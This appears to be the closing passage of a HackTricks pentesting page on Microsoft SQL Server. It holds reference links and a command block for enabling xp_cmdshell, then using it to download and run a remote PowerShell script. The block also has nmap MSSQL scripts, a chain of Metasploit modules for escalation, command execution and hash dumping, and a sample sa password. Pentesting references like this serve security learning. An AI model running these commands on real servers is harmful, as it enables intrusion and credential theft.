- [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
- [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)
- [https://mayfly277.github.io/posts/GOADv2-pwning-part12/](https://mayfly277.github.io/posts/GOADv2-pwning-part12/)
- [https://exploit7-tr.translate.goog/posts/sqlserver/?\_x_tr_sl=es&\_x_tr_tl=en&\_x_tr_hl=en&\_x_tr_pto=wapp](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)

## HackTricks 자동 명령
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
